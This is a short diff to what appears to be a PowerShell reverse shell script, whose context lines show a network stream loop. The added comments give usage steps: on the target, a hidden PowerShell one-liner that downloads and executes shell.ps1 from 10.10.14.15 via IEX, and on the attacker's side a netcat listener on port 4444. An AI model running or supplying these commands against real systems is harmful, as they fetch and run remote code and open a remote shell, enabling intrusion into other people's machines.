@@ -12,4 +12,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 };
 $client.Close()
 
+#Execute this code on remote machine
 #powershell.exe -nop -w hidden -c IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')
+
+#On attacking machine : nc -nlvp 4444
